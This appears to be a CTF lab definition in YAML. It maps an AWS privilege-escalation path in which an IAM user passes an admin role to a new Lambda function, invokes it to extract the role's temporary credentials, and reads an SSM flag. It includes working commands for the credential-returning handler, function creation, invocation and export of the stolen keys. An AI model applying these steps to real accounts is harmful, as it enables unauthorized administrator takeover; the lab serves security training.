attackMap:
  nodes:
    - id: starting-principal
      label: "Starting User"
      type: principal
      subType: iam-user
      arn: "arn:aws:iam::{account_id}:user/pl-prod-lambda-001-to-admin-starting-user"
      access:
        type: assumed-breach-credentials
      description: >
        You have gained access to this principal's AWS IAM credentials. These could
        have been obtained through many real-world vectors: phishing a developer and
        gaining access to their workstation, compromising a browser session, exploiting
        a vulnerable workload running in this AWS account, discovering credentials in
        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.

        Regardless of how you obtained them, you are now operating as this principal.
        This IAM user has iam:PassRole permission on the target admin role, along with
        lambda:CreateFunction and lambda:InvokeFunction permissions. This combination
        allows you to create a Lambda function that runs as the admin role and extract
        its temporary credentials.

    - id: lambda-function
      label: "Lambda Function"
      type: resource
      subType: lambda-function
      arn: "arn:aws:lambda:{region}:{account_id}:function/pl-lambda-001-credential-extractor"
      description: >
        This Lambda function is created by the attacker during the attack. It is
        configured to use the admin target role as its execution role. When invoked,
        the function returns the temporary AWS credentials it received from the
        execution role, allowing the attacker to operate as the admin role.

    - id: target-role
      label: "Admin Role"
      type: principal
      subType: iam-role
      isAdmin: true
      arn: "arn:aws:iam::{account_id}:role/pl-prod-lambda-001-to-admin-target-role"
      description: >
        This IAM role has AdministratorAccess. By passing this role to a Lambda function
        and invoking that function to extract its temporary credentials, you now have the
        ability to operate as an administrator in this AWS account. The admin credentials
        extracted from Lambda are then used to read the scenario's CTF flag from SSM
        Parameter Store.

    - id: ctf-flag
      label: "CTF Flag"
      type: resource
      subType: ssm-parameter
      isTarget: true
      arn: "arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/lambda-001-to-admin"
      description: >
        The CTF flag for this scenario, stored as an SSM parameter in the victim account.
        Retrieving it requires administrator-equivalent permissions (ssm:GetParameter is
        granted implicitly by AdministratorAccess). Your goal is to read this parameter
        using the admin credentials extracted from the Lambda function in the previous step.

  edges:
    - from: starting-principal
      to: lambda-function
      label: "iam:PassRole + lambda:CreateFunction"
      description: >
        Create a Lambda function that uses the admin target role as its execution role.
        The iam:PassRole permission allows the starting user to associate the admin role
        with the new Lambda function.
      hints:
        - "Review the policy attached to this user -- which IAM role can you pass, and to which service?"
        - "Use iam:ListRoles to discover roles in the account and identify which ones have elevated permissions."
        - "You can attach an IAM role to a Lambda function at creation time using the --role flag; this is what iam:PassRole enables."
        - "Write a minimal Lambda handler that reads and returns the execution role credentials from environment variables -- AWS injects them automatically."
        - "Package your handler as a zip file and use lambda:CreateFunction to deploy it with the admin role as the execution role."
        - "Browse to https://pathfinding.cloud/paths/lambda-001 for technique details."
      commands:
        - description: "Create a Lambda deployment package that extracts execution role credentials"
          command: |
            cat > /tmp/lambda_function.py << 'EOF'
            import os, json
            def lambda_handler(event, context):
                return {
                    'statusCode': 200,
                    'body': json.dumps({
                        'AWS_ACCESS_KEY_ID': os.environ.get('AWS_ACCESS_KEY_ID'),
                        'AWS_SECRET_ACCESS_KEY': os.environ.get('AWS_SECRET_ACCESS_KEY'),
                        'AWS_SESSION_TOKEN': os.environ.get('AWS_SESSION_TOKEN')
                    })
                }
            EOF
            cd /tmp && zip -q lambda_function.zip lambda_function.py
        - description: "Create the Lambda function with the admin execution role"
          command: "aws lambda create-function --function-name pl-lambda-001-credential-extractor --runtime python3.11 --role arn:aws:iam::{account_id}:role/pl-prod-lambda-001-to-admin-target-role --handler lambda_function.lambda_handler --zip-file fileb:///tmp/lambda_function.zip --timeout 30"

    - from: lambda-function
      to: target-role
      label: "lambda:InvokeFunction"
      description: >
        Invoke the Lambda function to execute code under the admin role's identity.
        The function returns the temporary credentials assigned to it via the execution
        role, granting the attacker administrative access.
      hints:
        - "Lambda functions need a few seconds to initialize after creation before they are ready to invoke."
        - "Use lambda:GetFunction to check the function's State field and confirm it is Active before invoking."
        - "Invoke the function with an empty payload and capture the response to a local file; the credentials are in the response body."
        - "The response body is a JSON-encoded string -- you need to parse it twice (outer response, then the body field) to extract the three credential values."
        - "Export AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, and AWS_SESSION_TOKEN from the parsed response, then verify your new identity with sts:GetCallerIdentity."
      commands:
        - description: "Invoke the Lambda function and capture the response"
          command: "aws lambda invoke --function-name pl-lambda-001-credential-extractor --payload '{}' /tmp/response.json && cat /tmp/response.json | jq '.'"
        - description: "Parse and export the extracted admin credentials"
          command: "BODY=$(cat /tmp/response.json | jq -r '.body') && export AWS_ACCESS_KEY_ID=$(echo \"$BODY\" | jq -r '.AWS_ACCESS_KEY_ID') && export AWS_SECRET_ACCESS_KEY=$(echo \"$BODY\" | jq -r '.AWS_SECRET_ACCESS_KEY') && export AWS_SESSION_TOKEN=$(echo \"$BODY\" | jq -r '.AWS_SESSION_TOKEN')"
        - description: "Verify administrator access"
          command: "aws sts get-caller-identity && aws iam list-users --max-items 3 --output table"

    - from: target-role
      to: ctf-flag
      label: "ssm:GetParameter"
      description: >
        With the admin role's temporary credentials now in hand, retrieve the scenario
        flag from SSM Parameter Store. AdministratorAccess grants ssm:GetParameter on
        all parameters in the account, so no additional permissions are needed beyond
        the credentials extracted from the Lambda execution environment.
      hints:
        - "You now hold temporary credentials for the admin role. The scenario flag is stored in an AWS service commonly used to hold configuration values and small secrets."
        - "Scenario flags live under a shared prefix in SSM Parameter Store — consider what a reasonable naming convention for this lab might look like."
        - "Use ssm:GetParameter with the full parameter name to retrieve the flag value."
      commands:
        - description: "Retrieve the CTF flag from SSM Parameter Store using admin credentials"
          command: "aws ssm get-parameter --name /pathfinding-labs/flags/lambda-001-to-admin --query 'Parameter.Value' --output text"
